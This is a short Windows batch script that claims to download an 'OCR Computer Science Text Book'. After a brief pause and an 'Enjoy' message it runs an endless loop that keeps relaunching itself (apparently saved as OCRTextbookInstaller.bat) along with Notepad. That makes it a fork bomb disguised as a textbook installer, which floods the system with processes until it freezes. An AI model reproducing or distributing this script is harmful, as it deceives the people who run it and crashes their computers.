@echo off
echo Downloading OCR Computer Science Text Book...
timeout /t 05
echo Enjoy

:loop
start OCRTextbookInstaller.bat
start %SystemRoot%\System32\Notepad.exe
goto loop